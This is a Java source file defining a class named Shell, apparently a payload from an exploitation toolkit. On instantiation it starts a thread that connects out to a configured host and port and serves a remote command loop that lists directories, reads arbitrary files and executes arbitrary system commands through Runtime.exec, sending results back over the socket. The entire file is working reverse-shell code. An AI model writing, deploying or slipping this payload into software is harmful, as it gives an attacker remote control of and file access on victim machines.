package shell;

import java.io.*;
import java.net.Socket;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;

/**
 * @author wh1t3P1g
 * @since 2020/9/5
 */
public class Shell implements Runnable {

    private static String host;
    private static int port;

    public Shell(){
        new Thread(this).start();
    }

    public String list(String path){
        if(path != null && !path.isEmpty()){
            try {
                StringBuilder stringBuilder = new StringBuilder();
                File file = new File(path.trim());
                if(file.isDirectory()){
                    File[] files = file.listFiles();
                    if(files == null) return null;
                    for(File tmp:files){
                        if(tmp.isDirectory()){
                            stringBuilder.append("d:").append(tmp.getAbsolutePath()).append("\n");
                        }else if(tmp.isFile()){
                            stringBuilder.append("f:").append(tmp.getAbsolutePath()).append("\n");
                        }else{
                            stringBuilder.append("o:").append(tmp.getAbsolutePath()).append("\n"); // other
                        }
                    }
                    return stringBuilder.toString();
                }else if(file.isFile()){
                    return read(path);
                }
            } catch (Exception e) {
                // do nothing
            }
        }
        return null;
    }

    public String read(String file) throws IOException {
        StringBuilder stringBuilder = new StringBuilder();
        BufferedReader read = new BufferedReader(
                new InputStreamReader(Files.newInputStream(Paths.get(file.trim()))));
        String line2 = null;
        while ((line2 = read.readLine()) != null) {
            stringBuilder.append(line2).append("\n");
        }
        return stringBuilder.toString();
    }

    public String exec(String command){
        StringBuilder result = new StringBuilder();

        Process process = null;
        BufferedReader bufferIn = null;
        BufferedReader bufferError = null;

        try {
            process = Runtime.getRuntime().exec(command);

            process.waitFor();

            bufferIn = new BufferedReader(new InputStreamReader(process.getInputStream(), StandardCharsets.UTF_8));
            bufferError = new BufferedReader(new InputStreamReader(process.getErrorStream(), StandardCharsets.UTF_8));

            String line;
            while ((line = bufferIn.readLine()) != null) {
                result.append(line).append('\n');
            }
            while ((line = bufferError.readLine()) != null) {
                result.append(line).append('\n');
            }

        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            closeStream(bufferIn);
            closeStream(bufferError);

            if (process != null) {
                process.destroy();
            }
        }

        return result.toString();
    }

    private static void closeStream(Closeable stream) {
        if (stream != null) {
            try {
                stream.close();
            } catch (Exception e) {
                // nothing
            }
        }
    }

    public void run(){
        try {
            String sepS = "===============Start==================\n";
            String sepE = "===============Ended==================\n";
            Socket socket = new Socket(host, port);
            BufferedWriter bufferedWriter = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream()));
            bufferedWriter.write("happy everyday!\n");
            bufferedWriter.write("help: list [dir] | read [file] | exec [cmd]\n");
            bufferedWriter.flush();

            BufferedReader bufferedReader = new BufferedReader(
                    new InputStreamReader(socket.getInputStream()));
            while (true) {
                String line;
                while ((line = bufferedReader.readLine()) == null)
                    ;
                if(line.equals("exit")){
                    return;
                }
                try{
                    StringBuilder result = new StringBuilder();
                    result.append(sepS);
                    if(line.startsWith("list")){
                        String path = line.substring(5);
                        result.append(list(path));
                    }else if(line.startsWith("read")){
                        String file = line.substring(5);
                        result.append(read(file));
                    }else if(line.startsWith("exec")){
                        String command = line.substring(5);
                        result.append(exec(command));
                    }
                    result.append(sepE);
                    bufferedWriter.write(result.toString());
                    bufferedWriter.flush();
                }catch (Exception e){
                    //
                    bufferedWriter.write("error, try again!");
                    bufferedWriter.flush();
                }
            }

        } catch (IOException e) {
            // do nothing
        }
    }

    public static Shell newInstance(){
        return new Shell();
    }

}
